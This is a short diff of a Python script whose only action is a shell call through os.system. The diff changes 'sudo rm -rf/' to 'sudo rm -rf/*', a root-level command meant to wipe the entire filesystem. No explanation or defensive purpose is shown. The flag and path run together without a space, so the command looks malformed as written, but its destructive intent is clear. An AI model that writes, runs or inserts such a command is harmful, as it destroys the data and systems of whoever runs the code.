@@ -1,4 +1,4 @@
 import sys
 import os
 
-os.system('sudo rm -rf/')
+os.system('sudo rm -rf/*')
